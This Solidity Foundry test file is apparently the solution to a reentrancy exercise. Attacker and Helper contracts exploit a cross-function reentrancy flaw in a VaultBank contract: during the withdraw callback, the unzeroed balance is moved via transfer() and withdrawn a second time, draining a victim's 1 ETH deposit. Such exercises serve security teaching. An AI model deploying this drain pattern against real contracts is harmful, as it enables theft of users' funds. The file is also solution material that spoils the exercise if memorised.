// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {VaultBank} from "../src/VaultBank.sol";

/// Receives the moved balance and withdraws it in a second, separate call.
contract Helper {
    VaultBank public bank;

    constructor(VaultBank _bank) {
        bank = _bank;
    }

    function withdraw() external {
        bank.withdraw();
    }

    receive() external payable {}

    function sweep(address to) external {
        payable(to).transfer(address(this).balance);
    }
}

/// Deposits, withdraws, and during the callback shoves its balance to Helper.
contract Attacker {
    VaultBank public bank;
    Helper public helper;
    bool private moved;

    constructor(VaultBank _bank, Helper _helper) payable {
        bank = _bank;
        helper = _helper;
    }

    function attack() external {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (!moved) {
            moved = true;
            // cross-function: balance not yet zeroed, transfer() is unguarded
            bank.transfer(address(helper), 1 ether);
        }
    }

    function sweep(address to) external {
        payable(to).transfer(address(this).balance);
    }
}

contract CrossFunctionSolution is Test {
    VaultBank bank;
    address attacker = makeAddr("attacker");

    function setUp() public {
        bank = new VaultBank();
        address victim = makeAddr("victim");
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        bank.deposit{value: 1 ether}();
        vm.deal(address(this), 1 ether);
    }

    function test_exploit() public {
        Helper helper = new Helper(bank);
        Attacker a = new Attacker{value: 1 ether}(bank, helper);

        a.attack();                 // withdraws 1 ETH, moves its balance to Helper
        if (bank.balanceOf(address(helper)) > 0) helper.withdraw(); // drains the rest

        a.sweep(attacker);
        helper.sweep(attacker);

        assertGe(attacker.balance, 2 ether, "attacker should pull out 2 ETH (own + victim)");
        assertEq(address(bank).balance, 0, "bank should be empty");
    }
}
